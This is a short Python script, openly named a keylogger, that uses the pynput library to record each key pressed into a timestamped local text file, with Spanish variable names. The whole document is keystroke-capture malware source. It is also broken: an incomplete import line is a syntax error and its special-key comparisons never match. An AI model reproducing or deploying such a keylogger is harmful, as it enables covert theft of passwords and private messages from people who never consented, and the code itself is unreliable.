from ast import
import datetime
from pynput.keyboard import Listener

x = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')

p = open(f'keylogger_{x}.txt', 'w')

def registro(llave):
    llave = str(llave)

    if llave == "'\\x03'":
        p.close()
        quit()
    elif llave == 'llave.enter':
        p.write('\n')
    elif llave == 'llave.enter':
        p.write(' ')  
    elif llave == 'llave.backspace':
        p.write('%borrar%')
    else:
        p.write(llave.replace("'",""))

with Listener(on_press=registro) as u:
    u.join()